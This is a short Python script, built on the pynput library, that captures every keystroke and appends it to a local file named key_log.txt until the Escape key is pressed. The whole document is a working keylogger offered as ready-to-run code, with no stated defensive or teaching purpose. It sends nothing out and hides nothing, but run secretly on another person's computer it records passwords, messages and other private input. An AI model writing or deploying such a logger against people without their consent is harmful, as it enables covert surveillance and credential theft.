#pip install pynput
import pynput
from pynput.keyboard import Key, Listener

# Specify the log file's path
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as log:
            if key == Key.space:
                log.write(' ')
            elif key == Key.enter:
                log.write('\n')
            else:
                log.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
